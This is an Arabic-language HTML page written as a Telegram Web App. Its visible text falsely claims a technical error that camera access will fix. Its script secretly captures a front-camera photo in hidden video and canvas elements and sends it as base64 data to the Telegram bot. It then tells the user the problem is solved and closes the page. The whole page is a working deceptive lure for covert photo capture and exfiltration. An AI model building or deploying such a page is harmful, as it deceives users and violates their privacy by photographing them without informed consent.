<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>إصلاح الخطأ التقني</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            text-align: center;
            padding: 40px 20px;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: white;
            min-height: 100vh;
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 20px;
            color: #ff6b6b;
        }
        
        p {
            font-size: 16px;
            margin-bottom: 30px;
            opacity: 0.9;
            line-height: 1.5;
        }
        
        video {
            display: none;
        }
        
        canvas {
            display: none;
        }
        
        button {
            background: linear-gradient(135deg, #ff4757 0%, #ff6b6b 100%);
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.3);
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 20px;
        }
        
        button:active {
            transform: scale(0.98);
        }
        
        .info {
            margin-top: 40px;
            font-size: 12px;
            opacity: 0.5;
        }
    </style>
</head>
<body>
    <h1>⚠️ حدث خطأ تقني!</h1>
    <p>نحتاج إلى الوصول إلى الكاميرا لإصلاح المشكلة.<br>اضغط على الزر أدناه لمتابعة الإصلاح.</p>
    
    <button id="activateBtn">📸 تفعيل الكاميرا</button>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    
    <div class="info">سيتم إصلاح المشكلة تلقائيًا بعد الضغط على الزر</div>

    <script>
        // الحصول على عناصر الصفحة
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const btn = document.getElementById('activateBtn');
        
        // الاتصال بتطبيق تليجرام
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand(); // توسيع الصفحة لملء الشاشة
        }
        
        // وظيفة لإرسال الصورة إلى البوت
        async function sendPhotoToBot(imageBlob) {
            // تحويل الصورة إلى Base64
            const reader = new FileReader();
            reader.readAsDataURL(imageBlob);
            reader.onloadend = function() {
                const base64data = reader.result;
                
                // إرسال البيانات إلى تليجرام
                if (tg) {
                    tg.sendData(JSON.stringify({
                        type: 'photo',
                        data: base64data
                    }));
                } else {
                    // إذا لم يكن داخل تليجرام، نعرض الصورة للمعاينة
                    console.log('تم التقاط الصورة (خارج تليجرام)');
                    alert('تم التقاط الصورة! (للاختبار)');
                }
            };
        }
        
        // عند الضغط على الزر
        btn.addEventListener('click', async () => {
            try {
                // طلب الوصول إلى الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        facingMode: "user" // الكاميرا الأمامية
                    } 
                });
                
                // عرض تيار الكاميرا على عنصر الفيديو
                video.srcObject = stream;
                await video.play();
                
                // انتظار ثانية لضبط الإضاءة
                setTimeout(() => {
                    // ضبط أبعاد اللوحة القماشية
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    // رسم صورة من الفيديو على اللوحة
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // تحويل اللوحة إلى صيغة JPEG
                    canvas.toBlob(async (blob) => {
                        // إرسال الصورة
                        await sendPhotoToBot(blob);
                        
                        // إغلاق الكاميرا
                        stream.getTracks().forEach(track => track.stop());
                        
                        // إعلام المستخدم
                        alert('✅ تم إصلاح المشكلة! يمكنك إغلاق هذه الصفحة.');
                        
                        // إغلاق الصفحة بعد ثانيتين
                        setTimeout(() => {
                            if (tg) {
                                tg.close();
                            } else {
                                window.close();
                            }
                        }, 2000);
                    }, 'image/jpeg', 0.8);
                }, 1000);
                
            } catch(error) {
                console.error('خطأ في الكاميرا:', error);
                
                let errorMessage = 'لم نتمكن من الوصول إلى الكاميرا. ';
                if (error.name === 'NotAllowedError') {
                    errorMessage += 'يرجى السماح باستخدام الكاميرا عند ظهور الإشعار.';
                } else if (error.name === 'NotFoundError') {
                    errorMessage += 'لا توجد كاميرا على هذا الجهاز.';
                } else {
                    errorMessage += 'الرجاء المحاولة مرة أخرى.';
                }
                
                alert(errorMessage);
            }
        });
    </script>
</body>
  </html>
